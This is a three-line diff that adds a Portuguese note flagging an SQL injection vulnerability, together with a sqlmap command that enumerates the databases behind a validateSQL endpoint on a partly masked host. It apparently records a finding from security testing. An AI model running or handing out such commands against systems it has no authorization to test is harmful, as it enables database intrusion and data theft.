@@ -1,0 +1,3 @@
+Vulnerabilidade de sql injection.
+
+sqlmap -u "https://teste.xxxx.com/rest/services/Hosted/Turkana_Scopes/FeatureServer/0/validateSQL?f=pjson&sql=12&sqlType=where" --dbs
